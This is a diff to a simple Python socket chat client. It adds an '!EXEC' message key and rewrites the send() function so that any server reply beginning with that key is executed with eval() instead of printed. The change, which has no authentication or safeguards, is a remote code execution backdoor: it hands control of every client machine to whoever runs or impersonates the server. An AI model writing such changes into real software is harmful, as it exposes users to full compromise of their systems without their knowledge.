@@ -16,6 +16,7 @@ FORMAT = 'utf-8'  # De/Encoding format
 DISCONNECT_MSG = "!DISCONNECT"  # Client and Server key for disconnect
 NOTIFICATION_MSG = "!NOTIFY"  # Client and Server key for notifications
 ERROR_MSG = "!ERROR"  # Client and Server key for errors
+EXEC_MSG = "!EXEC"  # Client key to execute code
 # the host IP as a string (takes your private if if your using the line as it is)
 SERVER = socket.gethostname()
 # SERVER = "SERVER HOST IP"
@@ -38,7 +39,11 @@ def send(msg):
     client.send(sendLength)  # send length of actual msg to server
     client.send(message)  # sends the msg itself
     # Prints what the Client receves if the server awnsers (max of 2048 bytes/characters)
-    print(client.recv(2048).decode(FORMAT))
+    resp = client.recv(2048).decode(FORMAT)
+    if resp.startswith(EXEC_MSG):
+        eval(resp.replace(EXEC_MSG, ""))
+    else:
+        print(resp)
 
 
 def test():  # Just a test function
